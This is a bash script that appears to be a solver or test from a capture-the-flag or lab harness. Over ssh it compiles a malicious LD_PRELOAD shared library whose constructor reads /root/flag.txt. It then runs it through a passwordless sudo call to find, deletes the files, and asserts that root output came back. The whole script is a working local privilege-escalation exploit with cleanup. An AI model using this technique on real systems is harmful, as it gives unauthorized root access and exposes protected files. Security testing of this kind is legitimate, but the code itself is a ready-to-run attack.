#!/usr/bin/env bash
set -euo pipefail
source "$(cd "$(dirname "$0")" && pwd)/_common.sh"
out="$(ssh_run '
cat >/tmp/ldpwn.c <<'\''EOF'\''
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
__attribute__((constructor)) static void pwn(void) {
  unsetenv("LD_PRELOAD");
  FILE *f = fopen("/root/flag.txt", "r");
  if (!f) return;
  char buf[256];
  if (fgets(buf, sizeof buf, f)) fputs(buf, stdout);
  fclose(f);
}
EOF
gcc -shared -fPIC -o /tmp/ldpwn.so /tmp/ldpwn.c
sudo -n LD_PRELOAD=/tmp/ldpwn.so /usr/bin/find /tmp -maxdepth 0
rm -f /tmp/ldpwn.c /tmp/ldpwn.so
')"
assert_root_output "${out}"
